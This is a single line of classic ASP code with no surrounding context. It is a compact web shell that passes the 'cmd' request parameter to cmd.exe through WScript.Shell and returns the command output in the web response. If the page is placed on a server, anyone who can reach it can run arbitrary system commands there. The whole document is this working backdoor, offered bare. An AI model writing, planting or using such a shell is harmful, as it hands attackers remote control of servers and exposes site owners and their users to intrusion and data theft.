<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>
